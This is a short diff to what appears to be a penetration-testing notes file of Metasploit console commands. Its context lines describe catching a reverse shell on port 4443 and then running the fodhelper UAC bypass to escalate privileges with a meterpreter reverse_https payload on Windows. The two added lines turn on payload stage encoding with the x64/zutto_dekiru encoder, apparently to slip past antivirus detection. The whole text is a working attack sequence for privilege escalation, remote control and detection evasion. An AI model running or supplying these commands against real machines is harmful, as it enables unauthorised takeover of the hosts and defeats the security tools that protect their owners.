@@ -19,6 +19,8 @@ msf6> exploit -j
 
 # After we get reverse shell on port 4443 we need to set new payload
 msf6 exploit(multi/handler) > use exploit/windows/local/bypassuac_fodhelper
+msf6 exploit(multi/handler) > set EnableStageEncoding true
+msf6 exploit(multi/handler) > set StageEncoder x64/zutto_dekiru
 msf6 exploit(multi/handler) > set target 1
 msf6 exploit(multi/handler) > set session 1
 msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
